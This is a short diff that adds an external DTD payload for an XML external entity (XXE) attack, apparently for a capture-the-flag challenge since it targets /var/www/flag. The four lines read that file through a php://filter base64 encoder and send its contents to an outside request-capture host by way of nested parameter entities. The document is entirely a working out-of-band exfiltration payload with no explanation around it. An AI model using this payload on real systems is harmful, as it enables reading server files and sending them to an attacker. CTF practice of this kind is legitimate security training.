@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/flag">
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://ucxmnvwb.requestrepo.com?x=%file;'>">
+%eval;
+%exfiltrate;
